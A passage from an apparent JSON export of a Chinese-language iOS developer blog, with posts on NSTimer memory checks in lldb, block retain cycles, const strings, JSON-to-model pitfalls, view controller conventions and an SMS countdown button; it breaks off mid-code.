所以才有了最终代码,打印日志如下 2016-01-12 17:34:22.452 Learn[32375:6683898] ExampleSingleton ShareInstance Did Create 0x7fa20a346e90 2016-01-12 17:34:22.453 Learn[32375:6683898] Access ShareInstance 0x7fa20a346e90 2016-01-12 17:34:23.403 Learn[32375:6683898] Access ShareInstance 0x7fa20a346e90 2016-01-12 17:34:23.403 Learn[32375:6683898] SharedInstance Reset Timer 2016-01-12 17:34:25.796 Learn[32375:6683898] Access ShareInstance 0x7fa20a346e90 2016-01-12 17:34:25.797 Learn[32375:6683898] SharedInstance Reset Timer 2016-01-12 17:34:35.797 Learn[32375:6683898] SharedInstance Will Halted 2016-01-12 17:34:35.797 Learn[32375:6683898] SharedInstance Did Halted 如何确定NSTimer是不是真的被释放了因为**[_timer invalidate]**仅仅是让倒计时触发停止,是不是真的被释放了内存呢?如果没有释放,会不会造成内存溢出? + (void)resetTimer &#123; if (_timer.isValid) &#123; [_timer invalidate]; _timer = nil; NSLog(@&quot;SharedInstance Reset Timer&quot;); &#125; //break point 此处打断点 _timer= [NSTimer scheduledTimerWithTimeInterval:600 target:self selector:@selector(haltSharedInstance) userInfo:nil repeats:NO]; &#125; 使用以上代码进行控制台调试lldb进行验证 2016-01-12 23:01:26.669 Learn[33017:6772455] ExampleSingleton ShareInstance Did Create 0x7ff378d10020 2016-01-12 23:01:26.670 Learn[33017:6772455] Access ExampleSingleton 0x7ff378d10020 (lldb) po _timer//1. timer未被初始化 nil (lldb) n (lldb) po _timer//2. timer初始化成功 地址一 &lt;__NSCFTimer: 0x7ff37b0028a0&gt; (lldb) po 0x7ff37b0028a0//3. 验证地址一内的内容 &lt;__NSCFTimer: 0x7ff37b0028a0&gt; (lldb) c//4. 继续执行 第二次触发断点 2016-01-12 23:01:53.404 Learn[33017:6772455] Access ExampleSingleton 0x7ff378d10020 2016-01-12 23:01:53.404 Learn[33017:6772455] ExampleSingleton Reset Timer (lldb) po 0x7ff37b0028a0 //5. 打印地址一,发现仅为地址,没有任何变量 140683717388448 (lldb) po _timer//6. 再次检查timer,没有任何指向 nil (lldb) n//7. 向下执行一行,进行初始化 (lldb) po _timer//8. 第二次初始化成功,地址二出现 &lt;__NSCFTimer: 0x7ff378e12a80&gt; (lldb) p 0x7ff378e12a80 //地址二的位置 (long) $7 = 140683681802880 (lldb) p 0x7ff37b0028a0//地址一的位置 (long) $8 = 140683717388448 发现如果进行无效后指向nil,第一次初始化的地址会被释放.使用上文中的最终版代码进行验证 2016-01-12 23:12:53.624 Learn[33048:6777254] ExampleSingleton ShareInstance Did Create 0x7ff4f041c980 2016-01-12 23:12:53.625 Learn[33048:6777254] Access ExampleSingleton 0x7ff4f041c980 (lldb) po _timer//1. timer未被初始化 nil (lldb) n (lldb) po _timer//2. timer初始化成功 地址一 &lt;__NSCFTimer: 0x7ff4f0514580&gt; (lldb) po 0x7ff4f0514580//3. 验证地址一内的内容 &lt;__NSCFTimer: 0x7ff4f0514580&gt; (lldb) c //4. 继续执行 第二次触发断点 Process 33048 resuming 2016-01-12 23:13:19.084 Learn[33048:6777254] Access ExampleSingleton 0x7ff4f041c980 2016-01-12 23:13:19.084 Learn[33048:6777254] ExampleSingleton Reset Timer (lldb) po 0x7ff4f0514580 //5. 打印地址一,发现变量未被释放 &lt;__NSCFTimer: 0x7ff4f0514580&gt; (lldb) po _timer//6. 再次检查timer,发现指向的仍为地址一,仅仅是从新启动了倒计时 &lt;__NSCFTimer: 0x7ff4f0514580&gt; 经过验证发现,如果仅仅**[_timer invalidate]**,静态指针指向的NSTimer并没有被释放,仅仅是停止了倒计时,下一次初始化时,还是在原地址,从新打开了新的倒计时.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Singleton","slug":"Singleton","permalink":"http://yoursite.com/tags/Singleton/"}]},{"title":"Block的使用和循环引用的隐患","date":"2016-01-09T15:00:00.000Z","path":"2016/01/10/Block的使用和循环引用的隐患/","text":"这里分析是错误的，确实没有引起循环引用，但是对于原因的定位是错误的，请参考以下文件 循环引用与闭包逃逸 Block本身会产生Retain么Block其实就是一段代码段,假设我在ClassA中使用ClassB的Block,block实际存在于ClassA的内存段p:0xXXXXX.也就是说在运行的时候如果ClassB的Block被使用,他会等待Block的代码段出现,如下. typedef void(^CompletionBlock)(NSString *message); //ClassB.h - (void)classBFunction:(CompletionBlock)completion; //ClassB.m - (void)classBFunction:(CompletionBlock)completion &#123; completion(@&quot;wait Block&quot;); &#125; 此时,我在ClassA中声明ClassB,并且调用该函数 //ClassA.m ClassB *b = [[ClassB alloc]init]; [b classBFunction:^(NSString *message) &#123; NSLog(@&quot;%@&quot;,message); &#125;]; 此时**NSLog(@”%@”,message)其实是ClassA中的代码片段,处于地址p.也就是说如果ClassB想在classBFunction:**内部completion执行传递来的NSLog,那么ClassA的内存千万不能被释放.也就是说ClassB必须用Block对ClassA产生一个Retain,一个强引用. Block分几种Block一共分三种 NSGlobalBlock：没有使用除了Block参数以外的变量； NSStackBlock：使用了Block参数以外的变量,位于栈内存,函数返回后Block就被释放； NSMallocBlock：位于堆内存,使用引用计数。 示例 BlkSum blk1 = ^ long (int a, int b) &#123; return a + b; &#125;; NSLog(@&quot;blk1 = %@&quot;, blk1);// blk1 = &lt;__NSGlobalBlock__: 0x47d0&gt; int base = 100; BlkSum blk2 = ^ long (int a, int b) &#123; return base + a + b; &#125;; NSLog(@&quot;blk2 = %@&quot;, blk2); // blk2 = &lt;__NSStackBlock__: 0xbfffddf8&gt; BlkSum blk3 = [[blk2 copy] autorelease]; NSLog(@&quot;blk3 = %@&quot;, blk3); // blk3 = &lt;__NSMallocBlock__: 0x902fda0&gt; Block如何产生的循环引用在较早版本的Xcode,由于Block会对.m本身的ClassA产生一个Retain,而ClassA如果想调用ClassB的Block,自然也会对ClassB产生一个Retain.所以Block作为传送指针的通道,就让AB互相强引用了,例如Bang的文献里说的. @interface ClassAViewController () @property (nonatomic, strong) ClassB *classB; @end - (void)viewDidAppear:(BOOL)animated &#123; [super viewDidAppear:animated]; _classB = [[ClassB alloc]init]; [_classB blockFunction:^(UIView *view) &#123; [self completionBlock]; &#125;]; &#125; - (void)completionBlock &#123; NSLog(@&quot;ClassAViewController Comlpetion Block&quot;); &#125; - (void)dealloc &#123; NSLog(@&quot;ClassAViewController did dealloc&quot;); &#125; 由于testFunction的block要调用ClassA(self)里的函数,为了防止这一段函数被释放,必须对ClassA产生一个Retain.在以前的版本为了避免产生循环引用,会使用一个weak指针指向self,然后通过weak指针调用self的函数. _b = [[ClassB alloc]init]; id weakself = self; [_b testFunction:^(UIView *view) &#123; [weakself completionBlock]; &#125;]; 经过Xcode7.2实际测试,这样书写已经不会产生循环引用,dealloc会被正常调用 还有一种可能的情况,有3个类形成通过block循环引用,但是很少见. +-----------+ +-----------+ +-----------+ | self | | obj | | Block | | ClassA | --------&gt; | ClassC | --------&gt; | ClassB | | retain 1 | | retain 1 | | retain 1 | | | | | | | +-----------+ +-----------+ +-----------+ ^ | | strong | +------------------------------------------------+ 我去专门复现也无法复现出来,因为ClassC中调用ClassB的Block,访问的是ClassC的内存段,ClassB基本很少有手段对ClassA产生Retain.因为总需要一个指针把ClassA传递给ClassB,如果使用弱指针传递,就相当旧版本时的weakself了 +-----------+ +-----------+ +-----------+ | self | | obj | | Block | | ClassA | --------&gt; | ClassC | --------&gt; | ClassB | | retain 1 | | retain 1 | | retain 1 | | | | | | | +-----------+ +-----------+ +-----------+ ^ | | weak | +---------------------------+ 那是不是ARC下Block不会产生循环引用了不是,与其担心Block造成循环引用,更应该关心透穿时使用什么指针 +-----------+ +-----------+ +-----------+ | self | strong | obj | strong | Block | | ClassA | --------&gt; | ClassC | --------&gt; | ClassB | | retain 1 | ?pointA | retain 1 | pointA | retain 1 | | | &lt;---------| | --------&gt; | | +-----------+ +-----------+ +-----------+ ^ | | weak | +---------------------------+ 循环引用例子 主ViewController用来Present出ClassAVC ClassAVC中有两个按钮,一个是dismiss自己,一个是present出ClassCVC ClassC中声明pointA,用于把ClassA传递给ClassC 在ClassC中初始化ClassB,执行闭包,传入pointA指针. 在上述过程中,pointA应该使用weak,如果使用了strong,ClassA对ClassC本身就是强引用,如果pointA也是强引用,就形成了循环引用,这种前后两个界面互相传递的情况比较常见,一不小心就会形成循环引用,这也是为什么推荐使用代码洁癖weak的prorerty的原因. +-----------+ +-----------+ | self | strong | obj | | ClassA | ---------------&gt; | ClassC | | retain 1 | strong-pointA | retain 1 | | | &lt;---------------- | | +-----------+ +-----------+ ClassA//ClassA.h @interface ClassAViewController : UIViewController - (void)completionBlock; @end //ClassA.m #import &quot;ClassCViewController.h&quot; @interface ClassAViewController () @property (nonatomic, strong) UIButton *btn; @property (nonatomic, strong) ClassCViewController *classCVC; @property (nonatomic, strong) UIButton *dismissBtn; @end @implementation ClassAViewController - (void)touchUpInsideButton:(UIButton *)button &#123; _classCVC = [[ClassCViewController alloc]init]; _classCVC.classAVC = self; [self presentViewController:_classCVC animated:YES completion:nil]; &#125; - (void)touchUpInsideDismissBtn:(UIButton *)button &#123; [self dismissViewControllerAnimated:YES completion:nil]; &#125; - (void)completionBlock &#123; NSLog(@&quot;ClassAViewController Comlpetion Block&quot;); &#125; - (void)dealloc &#123; NSLog(@&quot;ClassAViewController did dealloc%p&quot;,self); &#125; @end ClassC//ClassC.h @interface ClassCViewController : UIViewController //此处是pointA,使用了Strong,形成循环引用 @property (nonatomic, strong) ClassAViewController *classAVC; @end //ClassC.m #import &quot;ClassB.h&quot; #import &quot;ClassAViewController.h&quot; @interface ClassCViewController () @property (nonatomic, strong) UIButton *btn; @property (nonatomic, strong) ClassB *classB; @end @implementation ClassAViewController - (void)viewDidAppear:(BOOL)animated &#123; [super viewDidAppear:animated]; _classB = [[ClassB alloc]init]; [_classB blockFunction:^(UIView *view) &#123; [_classAVC completionBlock]; &#125;]; &#125; - (void)touchUpInsideButton:(UIButton *)button &#123; [self dismissViewControllerAnimated:YES completion:nil]; &#125; - (void)dealloc &#123; NSLog(@&quot;ClassCViewController did dealloc%p&quot;,self); &#125; @end ClassB//ClassB.h @interface ClassB : NSObject - (void)blockFunction:(void(^)(UIView *view))completion; @end //ClassB.m - (void)blockFunction:(void(^)(UIView *view))completion &#123; UIView *view = [[UIView alloc]initWithFrame:CGRectMake(0, 0, 50, 50)]; [view setBackgroundColor:[UIColor redColor]]; completion(view); &#125; 变量进入Block是传值还是传址使用了局部变量的NSStackBlock,对局部变量采用的是传值形式的调用,进入Block后更改不会影响原变量.如果想进行传址,需要加上**__block**标注 __block int base = 100; BlkSum blk2 = ^ long (int a, int b) &#123; base += 10; return base + a + b; &#125;; NSLog(@&quot;blk2 = %@&quot;, blk2); // blk2 = &lt;__NSStackBlock__: 0xbfffddf8&gt; 参考文献[1] http://git.devzeng.com/blog/ios-arc-block-retain-cycle.html[2] http://tanqisen.github.io/blog/2013/04/19/gcd-block-cycle-retain/[3] http://git.devzeng.com/blog/ios-arc-block-retain-cycle.html","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Cycle Retain","slug":"Cycle-Retain","permalink":"http://yoursite.com/tags/Cycle-Retain/"},{"name":"Block","slug":"Block","permalink":"http://yoursite.com/tags/Block/"}]},{"title":"常量字符串const加哪里","date":"2016-01-09T15:00:00.000Z","path":"2016/01/10/常量字符串const加哪里/","text":"书写固定的字符串有哪些方法宏#define HSCoder @&quot;汉斯哈哈哈&quot; 常量字符串static const NSString *HSCoder = @&quot;汉斯哈哈哈&quot;; const NSString *HSCoder = @&quot;汉斯哈哈哈&quot;; NSString const *HSCoder = @&quot;汉斯哈哈哈&quot;; NSString *const HSCoder = @&quot;汉斯哈哈哈&quot;; const位置不同有哪些区别结论:const右边的不能被修改 const NSString *HSCoder = @&quot;汉斯哈哈哈&quot;;//1. &quot;*HSCoder&quot;不能被修改， &quot;HSCoder&quot;能被修改 NSString const *HSCoder = @&quot;汉斯哈哈哈&quot;;//2. &quot;*HSCoder&quot;不能被修改， &quot;HSCoder&quot;能被修改 NSString * const HSCoder = @&quot;汉斯哈哈哈&quot;;//3. &quot;HSCoder&quot;不能被修改，&quot;*HSCoder&quot;能被修改 从以上可以知道情况1和2相同,没有区别. static静态区表示什么 全局常量：不管你定义在任何文件夹，外部都能访问 局部常量：用static修饰后，不能提供外界访问 如果一个局部常量在外部进行访问,编译时会提示找不到符号的错误 const NSString *HSCoder = @&quot;汉斯哈哈哈&quot;;//全局常量字符串 static const NSString *HSCoder = @&quot;汉斯哈哈哈&quot;;//局部常量字符串 UIKIT_EXTERN是干嘛的UIKIT_EXTERN相当于extern定义,表示扩展的全局常量,凡是定义了UIKIT_EXTERN的,只要包含了UIKit这个库,就可以访问这个常量.所以Apple本身常用以下这种形式定义在头文件. UIKIT_EXTERN NSString *const HSCoder; 代表的意思是 这是一个UIKit的扩展字符串,只要包含了UIKit就可以使用 这个NSString的指向的内容(*HSCoder)可以改变,但是指针本身指向的地址(HSCoder)不能变. 这是一个全局常量,可以外部访问 进行了这样的定义后,一般会在.m里实现真正的文本内容,由于条件2,在进行赋值的时候HSCoder = @”新内存”,HSCoder无法改变指向的内存地址,所以无法赋值. NSString *const HSCoder = @&quot;汉斯哈哈哈&quot;; 参考文献:[1] http://www.jianshu.com/p/f83335e036b5","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Const","slug":"Const","permalink":"http://yoursite.com/tags/Const/"}]},{"title":"C基本类型转成OC的类型","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/C基本类型转成OC的类型/","text":"OC对C类型的包装NSNumber由于NSNumber是个Object通过指针调用,而C类型是基本类型,是直接调用内存. - (NSNumber *)initWithChar:(char)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedChar:(unsigned char)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithShort:(short)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedShort:(unsigned short)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithInt:(int)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedInt:(unsigned int)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithLong:(long)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedLong:(unsigned long)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithLongLong:(long long)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedLongLong:(unsigned long long)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithFloat:(float)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithDouble:(double)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithBool:(BOOL)value NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithInteger:(NSInteger)value NS_AVAILABLE(10_5, 2_0) NS_DESIGNATED_INITIALIZER; - (NSNumber *)initWithUnsignedInteger:(NSUInteger)value NS_AVAILABLE(10_5, 2_0) NS_DESIGNATED_INITIALIZER; 快速转换除了写NSNumber的初始化类之外,还可以通过基本类型前加”@”快速转换. int a = 1; NSLog(@&quot;%d&quot;,a); NSLog(@&quot;%@&quot;,@2); id str = @3; NSLog(@&quot;%@&quot;,str); NSNumber *num = [[NSNumber alloc]initWithInt:@&quot;4&quot;]; NSLog(@&quot;%@&quot;,num); 例如,示例代码中str本身就是个NSNumber的类,由”@3”快速转换而成.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"JSON转模型需要注意的问题","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/JSON转模型需要注意的问题/","text":"Json转模型现在客户端和服务器端之间的数据交换格式基本都是JSON,转换的时候要注意一些坑坑( ╯-_-)╯~┴—┴ NSNull和nilOC中的空是nil,而Java中的空是null,nil代表指针不指向任何地址,内容为空,null就是代表真的空,C语言上的空,什么都没有,所以说当服务器端传来一个空字符串. &#123;&quot;string&quot;:&quot;null&quot;&#125; 在OC中被解析的时候,一般是先转化成Dictionary,然后用Model的NSString接收. NSString *string = Dictionary[@&quot;string&quot;]; 此时判断string是否为空会用 if([string isEqualToString:@&quot;&quot;]) &#123; //Do Something &#125; 这个时候,判断永远是NO的,因为string指向的内存根本不是NSString,而是一个NSNull,Json序列化的时候null会被序列化成NSNull而不是空的NSString. 关键字问题语言里都是有保留关键字的,所以说不能用关键字作为模型的属性,比如说new,因为JSON串中只是字符串,可以使用new,如果转化成Model的时候,就不能用服务端给出的字段作为属性了. 这个时候能找到服务端的写代码的,就去把他打一顿,找不到..就自己默默改然后加上备注就好了.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"JSON","slug":"JSON","permalink":"http://yoursite.com/tags/JSON/"}]},{"title":"ViewController上的代码规范和习惯","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/ViewController上的代码规范和习惯/","text":"代码规范代码具有一致性,一般都比较便于阅读和管理,每个人不一样,但是总之要整洁比较好,我的习惯是 视图使用自动布局 所有控件都有一个弱指针指向(参见我的Property强弱讨论文章) 初始化数据/初始化控件/布局/样式调整/动作分开管理 以下是代码示范 @interface BPLoginMainViewController () @property (nonatomic, weak) id name;//指向控件的弱指针 @end @implementation BPLoginMainViewController - (void)viewDidLoad &#123; [super viewDidLoad]; // Do any additional setup after loading the view. //初始化数据 [self dataInital]; // [self instituteSubviews];//初始化控件 [self constrainSubviewsLayout];//对控件进行约束 [self modifySubviewsPattern];//对控件进行样式调整 //添加动作/通知/手势等 [self addActionAndNotification]; &#125; - (void)dataInital &#123; &#125; #pragma mark - View Layout Pattern - (void)instituteSubviews &#123; //Init Subviews &lt;#type#&gt; *&lt;#name#&gt; = [[&lt;#type#&gt; alloc]init]; //Weak Point _&lt;#name#&gt; = &lt;#name#&gt;; //Add Subviews [&lt;#view#&gt; addSubview:_&lt;#name#&gt;]; &#125; - (void)constrainSubviewsLayout &#123; //Set autorizingMask [_&lt;#name#&gt; setTranslatesAutoresizingMaskIntoConstraints:NO]; //AutoLayout VF NSDictionary *views = NSDictionaryOfVariableBindings(_&lt;#name#&gt;); NSDictionary *metrics = @&#123;&#125;; NSMutableArray *constraints = [NSMutableArray array]; [constraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;&quot; options:0 metrics:metrics views:views]]; [&lt;#view#&gt; addConstraints:constraints]; //不通过数组直接添加约束数组 // [&lt;#view#&gt; addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;&quot; options:0 metrics:metrics views:views]]; //Single添加单个约束 // [&lt;#view#&gt; addConstraint:[NSLayoutConstraint constraintWithItem:_&lt;#name#&gt; attribute:&lt;#attribute#&gt; relatedBy:&lt;#relation#&gt; toItem:_&lt;#view#&gt; attribute:&lt;#attribute#&gt; multiplier:1.0 constant:0]]; &#125; - (void)modifySubviewsPattern &#123; //Modify Pattern &#125; #pragma mark - Action 添加所有动作和动作响应 - (void)addActionAndNotification &#123; //Action [&lt;#name#&gt; addTarget:&lt;#target#&gt; action:&lt;#action#&gt; forControlEvents:&lt;#UIControlEventTouchUpInside#&gt;] //Notification [[NSNotificationCenter defaultCenter] addObserver:&lt;#target#&gt; selector:&lt;#action#&gt; name:&lt;#NSNotification#&gt; object:&lt;#object#&gt;]; //Gesture UITapGestureRecognizer *&lt;#gesture#&gt; = [[UITapGestureRecognizer alloc]initWithTarget:&lt;#target#&gt; action:&lt;#action#&gt;]; &#125; @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"present出的ViewController位于哪个内存位置","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/present出的ViewController位于哪个内存位置/","text":"如何调用presentViewController调用present函数一般在ViewController里调用 UIViewController *vc = [[UIViewController alloc] init]; [self presentViewController:vc animated:YES completion:nil]; 那么vc是加入了哪个内存呢如果是NavigationController里的ViewController,是加入了NavigationController.viewControllers还是独立的一个Window? // The view controller that was presented by this view controller or its nearest ancestor. @property(nullable, nonatomic,readonly) UIViewController *presentedViewController NS_AVAILABLE_IOS(5_0); // The view controller that presented this view controller (or its farthest ancestor.) @property(nullable, nonatomic,readonly) UIViewController *presentingViewController NS_AVAILABLE_IOS(5_0); 由代码知道,其本身不在任何一个Array里,而是自身形成了一个链表.presentedViewController是指其present出来的VC,presentingViewController是指谁presented了当前VC.和VC当前VC本身是Tabbar还是Navigation还是普通VC没有关系.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"如何创造Model以及数据和模型的嵌套","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/如何创造Model以及数据和模型的嵌套/","text":"如何创造Model创造Model,就是把标准数据格式,转化成一个类,一般模型Model对应的是字典Dictionary.以便于修改和调用.Model可以用”.”语法调用,且可以赋值和修改,Dictionary如果不是mutable的话,在初始化后就不能改变了,调用还要记得key值 //Model.h @interface CustomModel : NSObject&lt;NSCopying&gt; @property (nonatomic, copy) NSString *theme; @property (nonatomic, copy) NSString *mark; - (instancetype)initWithDict:(NSDictionary *)dict; + (NSDictionary *)convertDictFromModel:(CustomModel *)model; + (instancetype)createWithDict:(NSDictionary *)dict; @end //Model.m @implementation CustomModel - (instancetype)initWithDict:(NSDictionary *)dict &#123; self = [super init]; if (self) &#123; self.theme = [dict valueForKey:@&quot;THEME&quot;]; self.mark = [dict valueForKey:@&quot;MARK&quot;]; &#125; return self; &#125; + (NSDictionary *)convertDictFromModel:(CustomModel *)model &#123; [dict setValue:model.theme forKey:@&quot;THEME&quot;]; [dict setValue:model.mark forKey:@&quot;MARK&quot;]; return dict; &#125; + (instancetype)createWithDict:(NSDictionary *)dict &#123; return [[self alloc]initWithDict:dict]; &#125; - (id)copyWithZone:(NSZone *)zone &#123; CustomModel *newItem = [[CustomModel allocWithZone:zone] init]; newItem.theme = self.theme; newItem.mark = self.mark; return newItem; &#125; @end 数据和模型数据主要是指通用化的结构数据,比如Array和Dictionary,模型是指自己自定义的Object 数据结构之间互相嵌套这个就和Json一样,都是基本类型,很容易解析 数据和模型之间的嵌套数据和模型之间嵌套,因为不能被标准库解析模型,所以一定要加入模型的.h文件,用来解析和使用 - (instancetype)initWithDict:(NSDictionary *)dict;//字典转模型(写) + (NSDictionary *)convertDictFromModel:(CustomModel *)model;//模型转字典(读,解析) + (instancetype)createWithDict:(NSDictionary *)dict;//字典转模型 模型套模型为了优化数据的结构,可以采用模型套模型,但是一定要记得加载两个模型的.h文件,以便使用模型. 这么麻烦,可不可以帮我自动生成啊有,我的老师说Github上有个她培训老师李明杰的第三放库,但是我没用过 MJextension","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"排序一个Dictionary的Array","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/排序一个Dictionary的Array/","text":"数组嵌套字典NSArray&lt;__kindof NSDictionary *&gt; *array; 根据array内部的Dictionary某个Key排序//字典数组按KEY排序 + (NSArray *)sortArray:(NSArray *)array withKey:(NSString *)key &#123; NSSortDescriptor *sortDesc = [NSSortDescriptor sortDescriptorWithKey:key ascending:YES]; NSArray *sortDescArr = [NSArray arrayWithObject:sortDesc]; NSArray *sortedArr = [array sortedArrayUsingDescriptors:sortDescArr]; return sortedArr; &#125; Array怎么排序Array是根据sortDescriptors进行排序,其本身是一个NSSortDescriptor的Array.所以只需要根据key来创建NSSortDescriptor,并放入一个数组就可以了. @interface NSArray&lt;ObjectType&gt; (NSSortDescriptorSorting) - (NSArray&lt;ObjectType&gt; *)sortedArrayUsingDescriptors:(NSArray&lt;NSSortDescriptor *&gt; *)sortDescriptors; // returns a new array by sorting the objects of the receiver @end @interface NSMutableArray&lt;ObjectType&gt; (NSSortDescriptorSorting) - (void)sortUsingDescriptors:(NSArray&lt;NSSortDescriptor *&gt; *)sortDescriptors; // sorts the array itself @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"短信验证码倒计时按键的实现","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/短信验证码倒计时按键的实现/","text":"短信验证码倒计时一般是个按键,设定一个定时器,每秒更新button的title,代码如下 @interface BPBaseViewController () @property (nonatomic, strong) NSTimer *codeTime; @end - (void)resetSmsVerifyCodeTimer:(UIButton *)button&#123; [button setTitle:@&quot;60&quot; forState:UIControlStateNormal]; [button setUserInteractionEnabled:NO]; _codeTime = [NSTimer scheduledTimerWithTimeInterval:1.0f target:self selector:@selector(updateTimerText:) userInfo:button repeats:YES]; &#125; - (void)updateTimerText:(NSTimer *)timer &#123; UIButton *button = [timer userInfo]; NSString *countdown = button.titleLabel.text; if([countdown isEqualToString:@&quot;0&quot;] || [countdown intValue] &lt; 1) &#123; [self cancelSMSTimer:timer]; &#125; else &#123; int icountdown = [countdown intValue]; icountdown--; NSString *ncountdown= [[NSString alloc] initWithFormat:@&quot;%d&quot;,icountdown]; [button setTitle:ncountdown forState:UIControlStateNormal]; &#125; &#125; - (void)cancelSMSTimer:(NSTimer *)timer&#123; UIButton *button = [timer userInfo]; if ([_codeTime isValid]) &#123; [_codeTime invalidate]; _codeTime = nil; &#125; [button setTitle:@&quot;获取验证码&quot; forState:UIControlStateNormal]; button.userInteractionEnabled = YES; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Message","slug":"Message","permalink":"http://yoursite.com/tags/Message/"}]},{"title":"调用系统短信进行发送","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/调用系统短信进行发送/","text":"调用系统短信发送发送短信主要用到MessageUI和MFMessageComposeViewControllerDelegate #import &lt;MessageUI/MessageUI.h&gt; @interface ViewController () &lt;MFMessageComposeViewControllerDelegate&gt; @end @implementation ViewController #pragma mark - SendMessage - (void)sendUrgeMessage:(NSArray *)numberArray &#123; //群发短信 BOOL canSendSMS = [MFMessageComposeViewController canSendText]; if (canSendSMS) &#123; //创建系统短信ViewController MFMessageComposeViewController *picker = [[MFMessageComposeViewController alloc] init]; picker.messageComposeDelegate = self; picker.navigationBar.tintColor = [UIColor whiteColor]; //设置收信人 picker.recipients = numberArray; //设置发送内容 NSString *textBody = @&quot;亲~记得好评哦&quot;; picker.body = textBody; //弹出短信窗口 [self presentViewController:picker animated:YES completion:nil]; &#125;else &#123; [UIAlertView showWithMessage:@&quot;陛下的手机短信异常ヽ(•̀ω•́ )ゝ哟&quot; delegate:nil]; &#125; &#125; #pragma mark - MFMessageComposeViewControllerDelegate - (void)messageComposeViewController:(MFMessageComposeViewController *)controller didFinishWithResult:(MessageComposeResult)result &#123; switch (result) &#123; case MessageComposeResultCancelled: break; case MessageComposeResultSent: break; case MessageComposeResultFailed: break; default: break; &#125; //收起发送框 [self dismissViewControllerAnimated:YES completion:nil]; &#125; @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Message","slug":"Message","permalink":"http://yoursite.com/tags/Message/"}]},{"title":"通用的自定义View","date":"2016-01-08T15:00:00.000Z","path":"2016/01/09/通用的自定义View/","text":"通用指针的好处我自定义一个View,内部有一个subView,位置是固定的,但是我有时候想放UIButtton,有时候想放UILabel.我应该声明一个什么样的Property呢 @property (nonatomic, strong) UIView *subView; 使用UIView,因为父类型指针可以任意指向子类型,严格的说任何指针都可以指向任何一个类型,因为指向的仅仅是地址,OC本身是动态的,只认内存地址.类型只是帮助编译器审查和联想. Example Code这段代码是写了一个CustomView,里面有左中右三个subView,三个subView使用的还是AutoLayout,还可以动态更新约束.主要是用到的思想是 保留指向约束的指针 新的subView加入后,使用指针从View中移出旧约束,加入新约束,然后刷新 SharedView.h// // SharedView.h #import &lt;Foundation/Foundation.h&gt; #import &lt;UIKit/UIKit.h&gt; @interface SharedView : NSObject @end @interface SharedView : UIView @property (nonatomic, strong) UIView *leftView; @property (nonatomic, strong) UIView *middleView; @property (nonatomic, strong) UIView *rightView; @property (nonatomic, assign) CGFloat leftViewWidth; @property (nonatomic, assign) CGFloat leftViewHeight; @property (nonatomic, assign) CGFloat leftViewLeftSpace; @property (nonatomic, assign) CGFloat leftViewRightSpace; @property (nonatomic, assign) CGFloat rightViewWidth; @property (nonatomic, assign) CGFloat rightViewHeight; @property (nonatomic, assign) CGFloat rightViewLeftSpace; @property (nonatomic, assign) CGFloat rightViewRightSpace; - (void)setTopLineHidden:(BOOL)hidden; - (void)setButtomLineHidden:(BOOL)hidden; - (void)setLeftLabelWithTitle:(NSString *)title; - (void)setLeftIconWithImage:(UIImage *)image; @end SharedView.m// // SharedView.m #import &quot;SharedView.h&quot; @interface SharedView () @property (nonatomic, strong) UIView *topLine; @property (nonatomic, strong) UIView *buttomLine; @property (nonatomic, strong) NSMutableArray *constraints; @property (nonatomic, strong) NSMutableDictionary *views; // @property (nonatomic, strong) NSLayoutConstraint *leftViewWidthConstraint; @property (nonatomic, strong) NSLayoutConstraint *leftViewHeightConstraint; @property 